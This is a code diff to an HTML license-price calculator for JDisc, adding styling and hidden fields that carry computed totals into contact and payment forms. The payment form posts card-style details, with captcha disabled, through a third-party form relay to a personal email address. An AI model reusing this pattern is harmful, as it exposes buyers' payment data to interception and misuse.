@@ -8,6 +8,129 @@
     <title>JDisc Calculator</title>
 
 </head>
+<style>
+ * {
+  box-sizing: border-box;
+}
+.divrow {
+  display: flex;
+}
+
+.divcolumn {
+  flex: 50%;
+}
+/* Container for flexboxes */
+.row {
+  display: flex;
+  flex-wrap: wrap;
+}
+
+/* Create four equal columns */
+.column {
+  flex: 25%;
+  padding: 20px;
+  box-shadow: 0px 0px 15px 3px #82f4ff;
+  background-color:rgba(130, 220, 255, 0.281);
+
+}
+.column2 {
+  flex: 25%;
+  padding: 20px;
+  background-color:rgba(116, 214, 253, 0.089);
+}
+
+/* On screens that are 992px wide or less, go from four columns to two columns */
+@media screen and (max-width: 992px) {
+  .column, .column2 {
+    flex: 50%;
+  }
+}
+
+/* On screens that are 600px wide or less, make the columns stack on top of each other instead of next to each other */
+@media screen and (max-width: 600px) {
+  .row {
+    flex-direction: column;
+  }
+}
+.select-box{
+  width: 200px;
+}
+.span-class{
+  line-height: 3.0;
+}
+.right{
+  text-align: right;
+}
+.button-green {
+  background-color: #13aa52;
+  border: 1px solid #13aa52;
+  border-radius: 4px;
+  box-shadow: rgba(0, 0, 0, .1) 0 2px 4px 0;
+  box-sizing: border-box;
+  color: #fff;
+  cursor: pointer;
+  font-family: "Akzidenz Grotesk BQ Medium", -apple-system, BlinkMacSystemFont, sans-serif;
+  font-size: 16px;
+  font-weight: 400;
+  outline: none;
+  outline: 0;
+  padding: 10px 25px;
+  text-align: center;
+  transform: translateY(0);
+  transition: transform 150ms, box-shadow 150ms;
+  user-select: none;
+  -webkit-user-select: none;
+  touch-action: manipulation;
+}
+
+.button-green:hover {
+  box-shadow: rgba(0, 0, 0, .15) 0 3px 9px 0;
+  transform: translateY(-2px);
+}
+
+@media (min-width: 768px) {
+  .button-green {
+    padding: 10px 30px;
+  }
+}
+.button-blue {
+  background-color: #002394;
+  border: 1px solid #002394;
+  border-radius: 4px;
+  box-shadow: rgba(0, 0, 0, .1) 0 2px 4px 0;
+  box-sizing: border-box;
+  color: #fff;
+  cursor: pointer;
+  font-family: "Akzidenz Grotesk BQ Medium", -apple-system, BlinkMacSystemFont, sans-serif;
+  font-size: 16px;
+  font-weight: 400;
+  outline: none;
+  outline: 0;
+  padding: 10px 25px;
+  text-align: center;
+  transform: translateY(0);
+  transition: transform 150ms, box-shadow 150ms;
+  user-select: none;
+  -webkit-user-select: none;
+  touch-action: manipulation;
+}
+
+.button-blue:hover {
+  box-shadow: rgba(0, 0, 0, .15) 0 3px 9px 0;
+  transform: translateY(-2px);
+}
+
+@media (min-width: 768px) {
+  .button-blue {
+    padding: 10px 30px;
+  }
+}
+.input-class{
+  line-height: 0.5;
+}
+
+   
+</style>
 <body>
 <div class="row">
     <div class="column">
@@ -151,6 +274,8 @@
                 <form method="post" name="myemailform" action="https://formsubmit.co/antonis-9@live.de">
 
                     <h2>Contact Details</h2>
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_next" value="https://vibrant-brown.185-207-107-69.plesk.page">
                     <div>
                         <input
                         type="text"
@@ -182,6 +307,13 @@
                         name="tel"
                         />
                     </div>
+
+                    <input type="hidden" name="Total Devices" id="maildevices">
+                    <input type="hidden" name="Tokens" id="mailtokens">
+                    <input type="hidden" name="License Cost" id="maillicensecost">
+                    <input type="hidden" name="Annual Subscription" id="mailannualsub">
+                    <input type="hidden" name="Total Cost" id="mailfinal">
+                    
                     <br>
                     <span class="span-class">If you submit the form by clicking &quot;SUBMIT&quot;, you agree with our</span>
                     <a
@@ -203,6 +335,8 @@
                 <form method="post" name="myemailform" action="https://formsubmit.co/antonis-9@live.de">
 
                     <h2>Payment Details</h2>
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_next" value="https://vibrant-brown.185-207-107-69.plesk.page">
                     <div>
                         <input
                         type="text"
@@ -234,6 +368,13 @@
                         name="exp"
                         />
                     </div>
+
+                    <input type="hidden" name="Total Devices" id="maildevices">
+                    <input type="hidden" name="Tokens" id="mailtokens">
+                    <input type="hidden" name="License Cost" id="maillicensecost">
+                    <input type="hidden" name="Annual Subscription" id="mailannualsub">
+                    <input type="hidden" name="Total Cost" id="mailfinal">
+
                     <br>
                     <span class="span-class">If you hit BUY, you agree with our</span>
                     <a
@@ -279,6 +420,8 @@
 
             // Calculate Devices
             document.getElementById('devices').innerHTML = x+y+z+a;
+
+            document.getElementById('maildevices').value = x+y+z+a;
             // End Calculate Devices
 
             // Calculate Tokens INDIVIDUAL
@@ -323,12 +466,17 @@
                 var totaltokens = sum + extratokens;
 
                 document.getElementById('tokens').innerHTML = totaltokens;
+
+                document.getElementById('mailtokens').value = totaltokens;
             // End Addons Counter
 
             // Tokens Without ADDONS 
             }else{
             totaltokens = x+y+z+a;
             document.getElementById('tokens').innerHTML = totaltokens;
+
+            document.getElementById('mailtokens').value = totaltokens;
+
             }
             // End Tokens Without ADDONS
 
@@ -374,17 +522,29 @@
                 document.getElementById('annualsub').innerHTML = '€' + " " + (cost*0.2).toFixed(2);
                 document.getElementById('final').innerHTML =  '€' + " " + finalcost.toFixed(2);
 
+                document.getElementById('maillicensecost').value = '€' + " " + cost.toFixed(2);
+                document.getElementById('mailannualsub').value = '€' + " " + (cost*0.2).toFixed(2);
+                document.getElementById('mailfinal').value =  '€' + " " + finalcost.toFixed(2);
+
 
             }else if (currency=='usd') {
                 document.getElementById('licensecost').innerHTML = '$' + " " + (cost*0.96).toFixed(2);
                 document.getElementById('annualsub').innerHTML = '$' + " " + ((cost*0.2)*0.96).toFixed(2);
                 document.getElementById('final').innerHTML =  '$' + " " + (finalcost*0.96).toFixed(2);
 
+                document.getElementById('maillicensecost').value = '$' + " " + (cost*0.96).toFixed(2);
+                document.getElementById('mailannualsub').value = '$' + " " + ((cost*0.2)*0.96).toFixed(2);
+                document.getElementById('mailfinal').value=  '$' + " " + (finalcost*0.96).toFixed(2);
+                
 
             }else if (currency=='gbp') {
                 document.getElementById('licensecost').innerHTML = '£' + " " + (cost*0.9).toFixed(2);
                 document.getElementById('annualsub').innerHTML = '£' + " " + ((cost*0.2)*0.9).toFixed(2);
                 document.getElementById('final').innerHTML =  '£' + " " + (finalcost*0.9).toFixed(2);
+
+                document.getElementById('maillicensecost').value = '£' + " " + (cost*0.9).toFixed(2);
+                document.getElementById('mailannualsub').value = '£' + " " + ((cost*0.2)*0.9).toFixed(2);
+                document.getElementById('mailfinal').value =  '£' + " " + (finalcost*0.9).toFixed(2);
 
             }
             // End Currence Converter
